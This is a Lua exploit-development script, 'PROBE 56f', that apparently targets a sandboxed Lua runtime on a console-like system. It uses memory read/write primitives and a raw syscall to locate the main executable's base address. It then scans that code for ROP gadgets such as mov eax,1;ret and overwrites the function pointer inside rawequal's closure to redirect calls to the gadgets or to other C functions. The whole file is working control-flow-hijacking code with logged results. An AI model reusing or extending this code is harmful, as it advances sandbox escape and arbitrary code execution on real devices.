-- CRASH_CLASS: LOW
-- PROBE 56f: Controlled return values via gadgets + stack reading
--
-- Context: 56e confirmed xor eax,eax;ret executes cleanly and reliably
-- (100/100 cycles, 65us each). Now we need gadgets that return useful
-- values to Lua.
--
-- Strategy:
--   [A] Safe scan for mov eax,1;ret (B8 01 00 00 00 C3) — smaller range
--   [B] Safe scan for mov eax,2;ret (B8 02 00 00 00 C3)
--   [C] Test mov eax,N;ret — returns N items from Lua stack
--   [D] Scan for "inc eax; ret" (FF C0 C3) — increments eax
--   [E] Read lua_State pointer from CClosure to understand C call ABI
--   [F] Test: redirect to a C function that writes to a known buffer

print("=== PROBE 56f: CONTROLLED RETURN VALUES ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo))
    end
    return nil
end

local rawequal_addr = parse_func_addr(rawequal)
local rawget_addr = parse_func_addr(rawget)
local select_addr = parse_func_addr(select)
local eboot_base = get_eboot_base()

print("[INFO] Addresses:")
print("  rawequal:   " .. hexval(rawequal_addr))
print("  eboot base: " .. hexval(eboot_base))

if not rawequal_addr or not eboot_base then
    print("ABORT: missing addresses")
    return
end

local eboot_hi, eboot_lo = get_hi_lo(eboot_base)

local function eboot_gadget(offset)
    local lo = eboot_lo + offset
    local hi = eboot_hi
    if lo >= 0x100000000 then
        hi = hi + 1
        lo = lo - 0x100000000
    end
    return lo, hi
end

-- Save originals
local rawequal_20_lo = safe_rd(rawequal_addr + 0x20)
local rawequal_20_hi = safe_rd(rawequal_addr + 0x24)

-- Known: xor eax,eax;ret at eboot+0x471
local xor_ret_lo, xor_ret_hi = eboot_gadget(0x471)

-- Safe scan helper: reads dwords with pcall, stops on failure
local function scan_bytes(pattern, max_off)
    local plen = #pattern
    for off = 0, max_off - 4, 4 do
        local addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
        local dw = safe_rd(addr)
        if not dw then break end  -- stop on unreadable page
        local bytes = {
            dw % 256,
            math.floor(dw / 256) % 256,
            math.floor(dw / 65536) % 256,
            math.floor(dw / 16777216) % 256,
        }
        -- Check pattern starting at each byte position
        for pos = 1, 4 do
            local match = true
            local needed = {}
            for i = 1, plen do
                local idx = pos + i - 1
                if idx <= 4 then
                    needed[i] = bytes[idx]
                else
                    -- Need bytes from next dword
                    local next_byte_off = idx - 4
                    if not needed._next then
                        local naddr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off + 4))
                        local ndw = safe_rd(naddr)
                        if not ndw then match = false; break end
                        needed._next = {
                            ndw % 256,
                            math.floor(ndw / 256) % 256,
                            math.floor(ndw / 65536) % 256,
                            math.floor(ndw / 16777216) % 256,
                        }
                    end
                    needed[i] = needed._next[next_byte_off]
                end
            end
            if match then
                local all_match = true
                for i = 1, plen do
                    if needed[i] ~= pattern[i] then all_match = false; break end
                end
                if all_match then
                    return off + pos - 1
                end
            end
        end
    end
    return nil
end

-- ============================================================
-- [A] Scan for mov eax,1;ret (B8 01 00 00 00 C3) — 256KB only
-- ============================================================
print("")
print("[A] Scanning eboot (256KB) for mov eax,1;ret")
local mov1_off = scan_bytes({0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3}, 0x40000)
if mov1_off then
    print(string.format("  FOUND at eboot+0x%X", mov1_off))
else
    print("  not in first 256KB")
end

-- ============================================================
-- [B] Scan for mov eax,2;ret
-- ============================================================
print("")
print("[B] Scanning eboot (256KB) for mov eax,2;ret")
local mov2_off = scan_bytes({0xB8, 0x02, 0x00, 0x00, 0x00, 0xC3}, 0x40000)
if mov2_off then
    print(string.format("  FOUND at eboot+0x%X", mov2_off))
else
    print("  not in first 256KB")
end

-- ============================================================
-- [C] Also scan for shorter patterns:
--     xor eax,eax; inc eax; ret = 31 C0 FF C0 C3 (returns 1)
--     push 1; pop rax; ret = 6A 01 58 C3 (returns 1)
-- ============================================================
print("")
print("[C] Alt pattern scans (256KB)")
local xor_inc_off = scan_bytes({0x31, 0xC0, 0xFF, 0xC0, 0xC3}, 0x40000)
if xor_inc_off then
    print(string.format("  xor eax,eax;inc eax;ret at eboot+0x%X", xor_inc_off))
else
    print("  xor eax,eax;inc eax;ret: not found")
end

local push1_off = scan_bytes({0x6A, 0x01, 0x58, 0xC3}, 0x40000)
if push1_off then
    print(string.format("  push 1;pop rax;ret at eboot+0x%X", push1_off))
else
    print("  push 1;pop rax;ret: not found")
end

collectgarbage("stop")

-- ============================================================
-- [D] Test mov eax,1;ret if found — should return 1 Lua result
-- The result will be whatever TValue is on top of the Lua stack
-- ============================================================
print("")
if mov1_off then
    print("[D] Testing mov eax,1;ret")
    local mov1_lo, mov1_hi = eboot_gadget(mov1_off)
    -- Push known values onto Lua stack before calling
    memory.write_dword(rawequal_addr + 0x20, mov1_lo)
    memory.write_dword(rawequal_addr + 0x24, mov1_hi)
    -- Call with number args
    local d_ok, d_r1, d_r2 = pcall(rawequal, 42, 99)
    print("  pcall(rawequal, 42, 99): ok=" .. tostring(d_ok) .. " r1=" .. tostring(d_r1) .. " r2=" .. tostring(d_r2))
    -- Call with string args
    local d2_ok, d2_r1, d2_r2 = pcall(rawequal, "hello", "world")
    print("  pcall(rawequal, 'hello', 'world'): ok=" .. tostring(d2_ok) .. " r1=" .. tostring(d2_r1) .. " r2=" .. tostring(d2_r2))
    -- Call with table arg
    local d3_ok, d3_r1 = pcall(rawequal, {1,2,3}, nil)
    print("  pcall(rawequal, {1,2,3}, nil): ok=" .. tostring(d3_ok) .. " r1=" .. tostring(d3_r1))
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("[D] SKIP: no mov eax,1;ret found")
    -- Try xor_inc_off or push1_off as alternatives
    local alt_off = xor_inc_off or push1_off
    if alt_off then
        local alt_name = xor_inc_off and "xor eax,eax;inc eax;ret" or "push 1;pop rax;ret"
        print("  Using alt gadget: " .. alt_name)
        local alt_lo, alt_hi = eboot_gadget(alt_off)
        memory.write_dword(rawequal_addr + 0x20, alt_lo)
        memory.write_dword(rawequal_addr + 0x24, alt_hi)
        local d_ok, d_r1, d_r2 = pcall(rawequal, 42, 99)
        print("  pcall(rawequal, 42, 99): ok=" .. tostring(d_ok) .. " r1=" .. tostring(d_r1) .. " r2=" .. tostring(d_r2))
        memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
        memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
        print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
    else
        print("  No return-1 gadget available")
    end
end

-- ============================================================
-- [E] Examine CClosure structure to understand the C call ABI
-- When Lua calls a CClosure, it passes lua_State* as first arg (rdi).
-- Read around rawequal's CClosure to find the lua_State pointer.
-- ============================================================
print("")
print("[E] CClosure structure dump (rawequal)")
for off = 0x00, 0x48, 8 do
    local val = safe_rq(rawequal_addr + off)
    print(string.format("  +0x%02X: %s", off, hexval(val)))
end

-- ============================================================
-- [F] Read the C function's first argument (lua_State*)
-- Redirect rawequal to a gadget that reads rdi and stores it.
-- Strategy: redirect to a known C function that writes its
-- lua_State* arg somewhere accessible. The tostring C function
-- calls luaL_checkstring which accesses L->top — if we redirect
-- to it we can observe its behavior.
--
-- Simpler: redirect rawequal to rawlen (lua_objlen), which
-- returns a number. The number is the length of its first arg.
-- This confirms we can get a Lua number back.
-- ============================================================
print("")
print("[F] Redirect rawequal -> rawlen (returns a number)")
local rawlen_addr = parse_func_addr(rawlen)
if rawlen_addr then
    local rawlen_20_lo = safe_rd(rawlen_addr + 0x20)
    local rawlen_20_hi = safe_rd(rawlen_addr + 0x24)
    print("  rawlen addr: " .. hexval(rawlen_addr))
    memory.write_dword(rawequal_addr + 0x20, rawlen_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawlen_20_hi)
    -- rawlen("hello") should return 5
    local f_ok, f_r1 = pcall(rawequal, "hello")
    print("  rawequal('hello') as rawlen: ok=" .. tostring(f_ok) .. " r=" .. tostring(f_r1))
    local f2_ok, f2_r1 = pcall(rawequal, "abcdefghij")
    print("  rawequal('abcdefghij') as rawlen: ok=" .. tostring(f2_ok) .. " r=" .. tostring(f2_r1))
    local f3_ok, f3_r1 = pcall(rawequal, {1,2,3,4,5})
    print("  rawequal({1..5}) as rawlen: ok=" .. tostring(f3_ok) .. " r=" .. tostring(f3_r1))
    -- Restore
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("  rawlen not available (Lua 5.1 — try table.maxn or #)")
    -- In Lua 5.1, rawlen doesn't exist. Try pcall to string.len's C func
    local strlen_addr = parse_func_addr(string.len)
    if strlen_addr then
        local strlen_20_lo = safe_rd(strlen_addr + 0x20)
        local strlen_20_hi = safe_rd(strlen_addr + 0x24)
        print("  string.len addr: " .. hexval(strlen_addr))
        print("  string.len +0x20: " .. string.format("0x%08X_%08X", strlen_20_hi or 0, strlen_20_lo or 0))
        memory.write_dword(rawequal_addr + 0x20, strlen_20_lo)
        memory.write_dword(rawequal_addr + 0x24, strlen_20_hi)
        local f_ok, f_r1 = pcall(rawequal, "hello")
        print("  rawequal('hello') as strlen: ok=" .. tostring(f_ok) .. " r=" .. tostring(f_r1))
        local f2_ok, f2_r1 = pcall(rawequal, "abcdefghij")
        print("  rawequal('abcdefghij') as strlen: ok=" .. tostring(f2_ok) .. " r=" .. tostring(f2_r1))
        memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
        memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
        print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
    else
        print("  string.len addr not found")
    end
end

-- ============================================================
-- [G] Key experiment: redirect rawequal to math.abs's C function
-- math.abs(x) returns a number. rawequal(-42) should return 42.
-- ============================================================
print("")
print("[G] Redirect rawequal -> math.abs (returns a number)")
local abs_addr = parse_func_addr(math.abs)
if abs_addr then
    local abs_20_lo = safe_rd(abs_addr + 0x20)
    local abs_20_hi = safe_rd(abs_addr + 0x24)
    print("  math.abs addr: " .. hexval(abs_addr))
    memory.write_dword(rawequal_addr + 0x20, abs_20_lo)
    memory.write_dword(rawequal_addr + 0x24, abs_20_hi)
    local g_ok, g_r1 = pcall(rawequal, -42)
    print("  rawequal(-42) as abs: ok=" .. tostring(g_ok) .. " r=" .. tostring(g_r1))
    local g2_ok, g2_r1 = pcall(rawequal, -999.5)
    print("  rawequal(-999.5) as abs: ok=" .. tostring(g2_ok) .. " r=" .. tostring(g2_r1))
    local g3_ok, g3_r1 = pcall(rawequal, 7)
    print("  rawequal(7) as abs: ok=" .. tostring(g3_ok) .. " r=" .. tostring(g3_r1))
    memory.write_dword(rawequal_addr + 0x20, rawequal_20_lo)
    memory.write_dword(rawequal_addr + 0x24, rawequal_20_hi)
    print("  verify rawequal(1,1) = " .. tostring(rawequal(1,1)))
else
    print("  math.abs addr not found")
end

collectgarbage("restart")

print("")
print("=== PROBE 56f COMPLETE ===")
